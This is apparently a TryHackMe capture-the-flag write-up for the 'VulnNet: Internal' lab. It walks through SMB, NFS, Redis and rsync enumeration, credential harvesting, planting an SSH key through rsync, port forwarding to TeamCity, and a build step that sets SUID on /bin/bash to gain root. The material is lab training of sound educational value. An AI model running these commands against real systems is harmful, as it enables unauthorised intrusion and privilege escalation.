# **VulnNet: Internal - TryHackMe**

*Target Ip. Address : 10.48.171.5*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.171.5
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 08:02 +0545
Nmap scan report for 10.48.171.5
Host is up (0.042s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7a:01:05:24:c4:b5:a9:1c:25:19:97:1d:2a:8d:87:25 (RSA)
|   256 16:36:9b:39:13:67:9a:9b:f5:be:90:f5:da:fe:04:c3 (ECDSA)
|_  256 9a:ea:7b:b3:74:d0:44:01:d1:2a:99:41:d5:55:10:ec (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33148/udp   mountd
|   100005  1,2,3      49685/tcp6  mountd
|   100005  1,2,3      53757/tcp   mountd
|   100005  1,2,3      54689/udp6  mountd
|   100021  1,3,4      33632/udp6  nlockmgr
|   100021  1,3,4      41285/tcp   nlockmgr
|   100021  1,3,4      42689/tcp6  nlockmgr
|   100021  1,3,4      46297/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn Samba smbd 4
445/tcp  open     netbios-ssn Samba smbd 4
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs         3-4 (RPC #100003)
9090/tcp filtered zeus-admin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                               
                                                                                                                                      
Host script results:                                                                                                                  
| smb2-security-mode:                                                                                                                 
|   3.1.1:                                                                                                                            
|_    Message signing enabled but not required                                                                                        
| smb2-time:                                                                                                                          
|   date: 2026-02-06T02:17:56                                                                                                         
|_  start_date: N/A                                                                                                                   
|_nbstat: NetBIOS name: IP-10-48-171-5, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)                                     
                                                                                                                                      
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                        
Nmap done: 1 IP address (1 host up) scanned in 18.75 seconds
```

There are many open ports, but ssh at port 22 tells it is a linux machine. Other services like smb shares, rsync and nfs are quite interesting. Let' start with the smb share.

```bash
kali@kali:smbclient -L \\10.48.171.5
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (ip-10-48-171-5 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.48.171.5 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

Guest login is allowed, let's see what we find inside shares.

```bash
kali@kali:smbclient \\\\10.48.171.5\\shares                                                                                                 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 15:05:09 2021
  ..                                  D        0  Tue Feb  2 15:13:11 2021
  temp                                D        0  Sat Feb  6 17:30:10 2021
  data                                D        0  Tue Feb  2 15:12:33 2021

                15376180 blocks of size 1024. 2145432 blocks available
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 15:12:33 2021
  ..                                  D        0  Tue Feb  2 15:05:09 2021
  data.txt                            N       48  Tue Feb  2 15:06:18 2021
  business-req.txt                    N      190  Tue Feb  2 15:12:33 2021

                15376180 blocks of size 1024. 2145432 blocks available
smb: \data\> cd ..
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 17:30:10 2021
  ..                                  D        0  Tue Feb  2 15:05:09 2021
  services.txt                        N       38  Sat Feb  6 17:30:09 2021

                15376180 blocks of size 1024. 2145432 blocks available
smb: \temp\> get services.txt
getting file \temp\services.txt of size 38 as services.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

We find some interesting files, others are just conversation, and services.txt is our first flag.

```bash
kali@kali:cat services.txt                                                                                                                  
THM{0a.....0a}
```

Now, let's see if we can get anything from nfs share.

```bash
kali@kali:showmount -e 10.48.171.5
Export list for 10.48.171.5:
/opt/conf *
```

We have something, let's mount the share on our machine, and see what it has for us.

For this, we will make a temporary directory, and mount the shares in that directory.

```bash
kali@kali:mkdir /tmp/mount

kali@kali:sudo mount -t nfs 10.48.171.5:/opt/conf /tmp/mount
```

Let's see what we have.

```bash
kali@kali:cd /tmp/mount 

kali@kali:ls                                                                                                                                
hp  init  opt  profile.d  redis  vim  wildmidi
```

So, it seems we have a redis configuration, let's see if we have some hardcoded credentials.

```bash
kali@kali:cat redis.conf | grep pass                                                                                                        
# 2) No password is configured.
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
requirepass "B6...@F"
# resync is enough, just passing the portion of data the slave missed while
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
# requirepass foobared
```

Yay, we find a redis password. But our previous nmap scan didn't find redis running. Let's run nmap again on redis default port (6379).

```bash
kali@kali:nmap -p 6379 -sV -sC 10.48.171.5
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 08:21 +0545
Nmap scan report for 10.48.171.5
Host is up (0.076s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.27 seconds
```

So, it is running at port 6379, I don't know why previous nmap didn't find it. Anyways, we have a password for redis. Let's see what it has for us.

```bash
kali@kali:redis-cli -h 10.48.171.5 -a "B6...@F"
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.48.171.5:6379> 
```

We are in, let's dive further.
We find our second flag.

```bash
10.48.171.5:6379> keys *
1) "internal flag"
2) "marketlist"
3) "int"
4) "tmp"
5) "authlist"
10.48.171.5:6379> get "internal flag"
"THM{ff.....21}"
```

From here, authlist seemed kind of interesting. To read it first we have to know it's type, and use proper command to read it.

```bash
10.48.171.5:6379> type authlist
list
10.48.171.5:6379> lrange "authlist" 0 100
1) "QXV0aG9yaXphdG...ZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdG...ZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdG...ZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdG...ZzNIUDY3QFRXQEJjNzJ2Cg=="
```
We have some base64 encoded text, let's decode it.

```bash
kali@kali:echo "QXV0aG9yaXphdG...ZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hc...2v
```

Oh Wow, we have a password for rsync. Rsync is a Linux utility that can synchronize files and directories remotely or locally.

Let's see the available shares on rsync.

```bash
kali@kali:rsync -av --list-only rsync://10.48.171.5
files           Necessary home interaction
```

So, we have files share, let's download that to our attacker machine.

```bash
kali@kali:mkdir rsync                                                                                                                       

kali@kali:rsync -av rsync://rsync-connect@10.48.171.5/files ./rsync
Password: 
receiving incremental file list
./
ssm-user/
ssm-user/.bash_logout
ssm-user/.bashrc
ssm-user/.profile
sys-internal/
sys-internal/.Xauthority
sys-internal/.bash_history -> /dev/null
sys-internal/.bash_logout
sys-internal/.bashrc
sys-internal/.dmrc
sys-internal/.profile
sys-internal/.rediscli_history -> /dev/null
sys-internal/.sudo_as_admin_successful
sys-internal/.xscreensaver
sys-internal/.xsession-errors
sys-internal/.xsession-errors.old
sys-internal/user.txt
.
.
.
```

So, we find user.txt inside sys-internal. Let's read our third flag.

```bash
kali@kali:cat user.txt                                                                                                                      
THM{da.....ab}
```

Rsync not only allows to download, but also allows to upload. So, we can basically upload ssh public key to login via ssh. First, let's generate a ssh key.

```bash
kali@kali:ssh-keygen -t rsa                                                                                                                 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/id_rsa
Enter passphrase for "/home/kali/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/id_rsa
Your public key has been saved in /home/kali/id_rsa.pub
The key fingerprint is:
SHA256:pHkCe4GnxbiYSMK3iX1Y/8nFvLeTGyS+2ZvgFrcGZeQ kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|.    +       .   |
|.o .+.= .   o    |
|o.+o=B.=  o  E   |
|..o=+.=.S  =o.   |
|    .. oo +o+.   |
|         + ++oo  |
|          ..*=+  |
|          .+.*+  |
+----[SHA256]-----+
```

Now, put that public key in authorized_keys file.

```bash
kali@kali:echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHlC6MxSoJDGkvqwvQHG87MWmMxY0Z9LD+UmaShgZEWCfQk4tyclzvKA6DvcO98SQldkubDFgUkxfL37Iw4M924WTJ2zwZhHqdEIrGDL4PDpxzq2OBaxMgp/PjxKZBPk6TbM3kjPOognc+45n1XPrvSlrMA2TvMjoKfZDqZOGhUn5Ow60wxHAxrnZA5Sb35xh//zyRZw/aw3hz3sgFUqE41KecuLt9TZagTE0XDriP+09dHBmKJoJ/+KSFnTOjssjhhMZYp1oH3bqx+bLMFGa3+ASxRjAUAvi3JvVbadgIfHRToZ0Ze4CVKffJj/SJOerP0enKcr76kOzOS9B2/Bl1wHGxmOPHdARS6mN0nJ1vHPrFSd4dYk78jDvnFOe0+cuS+o0K1kipPCgsJQ6q37WXIXvtdsV3TX6Clw4k0moUqzwEXLsISkKjJXkyVXcltE0Es11lzHePfY+0R2vX0se6YxP0SRy8NBkWAJ90nAtmvqTZJRfFd6pgjgAepNpxQbU= kali@kali" > authorized_keys
```

Since, there was no authorized_keys file in .ssh folder of sys-internal, we can just upload the authorized_keys

```bash
kali@kali:rsync -av authorized_keys rsync://rsync-connect@10.48.171.5/files/sys-internal/.ssh/authorized_keys                               
Password: 
sending incremental file list
authorized_keys

sent 676 bytes  received 35 bytes  45.87 bytes/sec
total size is 563  speedup is 0.79
```

Now, change permissions on the private key and we can login as user sys-internal via ssh.

```bash
kali@kali:chmod 600 id_rsa

kali@kali:ssh -i id_rsa sys-internal@10.48.171.5
The authenticity of host '10.48.171.5 (10.48.171.5)' can't be established.
ED25519 key fingerprint is: SHA256:JnqGPmffY3eDePDfB/hThVW+ssQDpwK+rHVZvTNn/Bo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.171.5' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

36 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@ip-10-48-171-5:~$ 
```

Further enumerating, I found TeamCity folder in top-level directory. TeamCity is CI/CD tool.

```bash
sys-internal@ip-10-48-171-5:/$ ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv       sys       tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  swapfile  TeamCity  usr  vmlinuz
```

Online research and I found out that TeamCity, runs on default 8111 port. Let's see if we have that port running.

```bash
sys-internal@ip-10-48-171-5:~$ ss -tulnp
Netid       State        Recv-Q       Send-Q                  Local Address:Port                Peer Address:Port       Process       
udp         UNCONN       0            0                             0.0.0.0:2049                     0.0.0.0:*                        
udp         UNCONN       0            0                       127.0.0.53%lo:53                       0.0.0.0:*                        
udp         UNCONN       0            0                    10.48.171.5%ens5:68                       0.0.0.0:*                        
udp         UNCONN       0            0                             0.0.0.0:111                      0.0.0.0:*                        
udp         UNCONN       0            0                       10.48.191.255:137                      0.0.0.0:*                        
udp         UNCONN       0            0                         10.48.171.5:137                      0.0.0.0:*                        
udp         UNCONN       0            0                             0.0.0.0:137                      0.0.0.0:*                        
udp         UNCONN       0            0                       10.48.191.255:138                      0.0.0.0:*                        
udp         UNCONN       0            0                         10.48.171.5:138                      0.0.0.0:*                        
udp         UNCONN       0            0                             0.0.0.0:138                      0.0.0.0:*                        
udp         UNCONN       0            0                             0.0.0.0:33148                    0.0.0.0:*                        
udp         UNCONN       0            0                             0.0.0.0:55807                    0.0.0.0:*                        
udp         UNCONN       0            0                             0.0.0.0:43792                    0.0.0.0:*                        
udp         UNCONN       0            0                             0.0.0.0:35645                    0.0.0.0:*                        
udp         UNCONN       0            0                             0.0.0.0:46297                    0.0.0.0:*                        
udp         UNCONN       0            0                             0.0.0.0:5353                     0.0.0.0:*                        
udp         UNCONN       0            0                                [::]:2049                        [::]:*                        
udp         UNCONN       0            0                                [::]:111                         [::]:*                        
udp         UNCONN       0            0                                [::]:57474                       [::]:*                        
udp         UNCONN       0            0                                [::]:32941                       [::]:*                        
udp         UNCONN       0            0                                [::]:52023                       [::]:*                        
udp         UNCONN       0            0                                [::]:33632                       [::]:*                        
udp         UNCONN       0            0                                [::]:5353                        [::]:*                        
udp         UNCONN       0            0                                [::]:54689                       [::]:*                        
tcp         LISTEN       0            64                            0.0.0.0:2049                     0.0.0.0:*                        
tcp         LISTEN       0            128                           0.0.0.0:22                       0.0.0.0:*                        
tcp         LISTEN       0            4096                          0.0.0.0:111                      0.0.0.0:*                        
tcp         LISTEN       0            50                            0.0.0.0:139                      0.0.0.0:*                        
tcp         LISTEN       0            511                           0.0.0.0:6379                     0.0.0.0:*                        
tcp         LISTEN       0            4096                          0.0.0.0:51573                    0.0.0.0:*                        
tcp         LISTEN       0            64                            0.0.0.0:41285                    0.0.0.0:*                        
tcp         LISTEN       0            50                            0.0.0.0:445                      0.0.0.0:*                        
tcp         LISTEN       0            4096                          0.0.0.0:53757                    0.0.0.0:*                        
tcp         LISTEN       0            4096                    127.0.0.53%lo:53                       0.0.0.0:*                        
tcp         LISTEN       0            5                             0.0.0.0:873                      0.0.0.0:*                        
tcp         LISTEN       0            5                           127.0.0.1:631                      0.0.0.0:*                        
tcp         LISTEN       0            4096                          0.0.0.0:40915                    0.0.0.0:*                        
tcp         LISTEN       0            64                               [::]:2049                        [::]:*                        
tcp         LISTEN       0            128                              [::]:22                          [::]:*                        
tcp         LISTEN       0            4096                             [::]:111                         [::]:*                        
tcp         LISTEN       0            50                               [::]:139                         [::]:*                        
tcp         LISTEN       0            1                  [::ffff:127.0.0.1]:8105                           *:*                        
tcp         LISTEN       0            100                [::ffff:127.0.0.1]:8111                           *:*                        
tcp         LISTEN       0            50                               [::]:445                         [::]:*                        
tcp         LISTEN       0            50                 [::ffff:127.0.0.1]:58503                          *:*                        
tcp         LISTEN       0            4096                             [::]:49685                       [::]:*                        
tcp         LISTEN       0            5                                [::]:873                         [::]:*                        
tcp         LISTEN       0            50                                  *:9090                           *:*                        
tcp         LISTEN       0            4096                             [::]:56377                       [::]:*                        
tcp         LISTEN       0            511                             [::1]:6379                        [::]:*                        
tcp         LISTEN       0            50                                  *:42373                          *:*                        
tcp         LISTEN       0            64                               [::]:42689                       [::]:*                        
tcp         LISTEN       0            4096                             [::]:40829                       [::]:*                        
tcp         LISTEN       0            5                               [::1]:631                         [::]:* 
```

Indeed, port 8111 is active. We will do port forwarding for this, so that we can access it.

```bash
kali@kali:ssh -L 8111:127.0.0.1:8111 -i id_rsa sys-internal@10.48.171.5
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

36 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Fri Feb  6 04:03:06 2026 from 192.168.130.26
sys-internal@ip-10-48-171-5:~$ 
```

Let's head to 127.0.0.1:8111 on our attacker machine.

<img width="526" height="600" alt="image" src="https://github.com/user-attachments/assets/814fcc6d-fed4-47a5-bd03-d4635b4e31e2" />

So, we have a login page. Let's see inside the TeamCity folder to see if we can find any credentials.

After lot's pf juggling arround. I found a superuser token and we can login using that.

```bash
sys-internal@ip-10-48-171-5:/TeamCity/logs$ cat catalina.out
NOTE: Picked up JDK_JAVA_OPTIONS:  --add-opens jdk.management/com.sun.management.internal=ALL-UNNAMED -XX:+IgnoreUnrecognizedVMOptions --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
06-Feb-2021 13:30:06.015 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.61
06-Feb-2021 13:30:06.039 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Dec 3 2020 14:03:28 UTC
06-Feb-2021 13:30:06.039 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.61.0
06-Feb-2021 13:30:06.039 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
06-Feb-2021 13:30:06.040 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            4.15.0-135-generic
06-Feb-2021 13:30:06.040 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
06-Feb-2021 13:30:06.040 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-11-openjdk-amd64
06-Feb-2021 13:30:06.040 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           11.0.9.1+1-Ubuntu-0ubuntu1.18.04
06-Feb-2021 13:30:06.041 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Ubuntu
06-Feb-2021 13:30:06.041 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /TeamCity
06-Feb-2021 13:30:06.041 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /TeamCity
06-Feb-2021 13:30:06.042 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=jdk.management/com.sun.management.internal=ALL-UNNAMED
06-Feb-2021 13:30:06.042 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -XX:+Ignore
.
.
.
.
Java: 11.0.27, OpenJDK 64-Bit Server VM (11.0.27+6-post-Ubuntu-0ubuntu120.04, mixed mode, sharing), OpenJDK Runtime Environment (11.0.27+6-post-Ubuntu-0ubuntu120.04), Ubuntu; JVM parameters: --add-opens=jdk.management/com.sun.management.internal=ALL-UNNAMED -XX:+IgnoreUnrecognizedVMOptions --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED -Djava.util.logging.config.file=/TeamCity/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Xmx1024m -Dteamcity.configuration.path=../conf/teamcity-startup.properties -Dlog4j.configuration=file:/TeamCity/bin/../conf/teamcity-server-log4j.xml -Dteamcity_logs=/TeamCity/bin/../logs -Djava.awt.headless=true -Dignore.endorsed.dirs= -Dcatalina.base=/TeamCity -Dcatalina.home=/TeamCity -Djava.io.tmpdir=/TeamCity/temp
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by com.thoughtworks.xstream.core.util.Fields (file:/TeamCity/webapps/ROOT/WEB-INF/lib/xstream-1.4.11.1-custom.jar) to field java.util.TreeMap.comparator
WARNING: Please consider reporting this to the maintainers of com.thoughtworks.xstream.core.util.Fields
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
=======================================================================
TeamCity initialized, server UUID: 61907dff-244c-4220-b252-31de83974909, URL: http://localhost:8111
TeamCity is running in professional mode
[TeamCity] Super user authentication token: 60.....50 (use empty username with the token as the password to access the server)
[2026-02-06 03:31:12,022]   WARN [10c0ed7'; Scheduled executor 1] -   jetbrains.buildServer.UPDATE - Unable to check for TeamCity updates via  URL "https://www.jetbrains.com/teamcity/update.xml": org.apache.http.conn.HttpHostConnectException: Connect to www.jetbrains.com:443 [www.jetbrains.com/18.172.78.37, www.jetbrains.com/18.172.78.52, www.jetbrains.com/18.172.78.116, www.jetbrains.com/18.172.78.12] failed: Connection timed out (Connection timed out) (enable debug to see stacktrace)
[2026-02-06 03:31:12,023]   WARN [10c0ed7'; Scheduled executor 1] -   jetbrains.buildServer.UPDATE - Error while checking new TeamCity version: jetbrains.buildServer.updates.ServerUpdateException: Unable to check for updates via URL "https://www.jetbrains.com/teamcity/update.xml": Connect to www.jetbrains.com:443 [www.jetbrains.com/18.172.78.37, www.jetbrains.com/18.172.78.52, www.jetbrains.com/18.172.78.116, www.jetbrains.com/18.172.78.12] failed: Connection timed out (Connection timed out) (enable debug to see stacktrace)
```

<img width="1067" height="485" alt="image" src="https://github.com/user-attachments/assets/012b4bfd-edb9-487b-953e-3caa066d0ff9" />

So, we can create projects and stuffs as a superuser.

I created a project, following the instructions and under build scripts, I chose command line and in custom scriot added "chmod +s /bin/bash". This we make /bin/bash a SUID and we can become root easily.

<img width="1064" height="820" alt="image" src="https://github.com/user-attachments/assets/64a15725-c639-4d4c-be68-c13b659e3a69" />

Run the build, it will take some time. After the build success, check if our command got executed.

```bash
sys-internal@ip-10-48-171-5:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Our command ran successfully, now we can escalate to root.

```bash
sys-internal@ip-10-48-171-5:~$ /bin/bash -p
bash-5.0# id
uid=1000(sys-internal) gid=1000(sys-internal) euid=0(root) egid=0(root) groups=0(root),24(cdrom),1000(sys-internal)
```

Let's read our final flag and complete this challenge.

```bash
bash-5.0# cat root.txt
THM{e8.....bd}
```
